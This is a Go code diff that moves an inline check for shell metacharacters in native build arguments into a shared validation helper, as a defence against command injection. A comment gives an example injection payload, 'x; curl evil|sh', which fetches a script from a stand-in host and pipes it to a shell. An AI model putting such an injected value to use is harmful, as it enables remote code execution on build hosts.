@@ -225,10 +225,14 @@ func resolveNativeBuildCommand(platform BuildPlatform, workDir string, extraArgs
 	// an LLM) is spliced into that string. Refuse any element carrying shell
 	// metacharacters so `{"scheme":"x; curl evil|sh"}` cannot execute — legit
 	// build args are plain identifiers/flags (assembleRelease, --flavor=prod).
-	for _, a := range extraArgs {
-		if strings.ContainsAny(a, ";&|<>$`\n\r(){}!*?\\\"'") {
-			return "", nil, false
-		}
+	// Shared with every other platform via validateBuildArgs (builds.go) so the
+	// two charsets cannot drift. resolveBuildCommand now applies this to ALL
+	// platforms before calling here, so by this point it is a backstop for any
+	// direct caller — note that returning false here means "not a native
+	// platform" and falls through, which is why the authoritative check runs
+	// upstream rather than in this function.
+	if validateBuildArgs(extraArgs) != nil {
+		return "", nil, false
 	}
 	extra := strings.Join(extraArgs, " ")
 	if extra != "" {
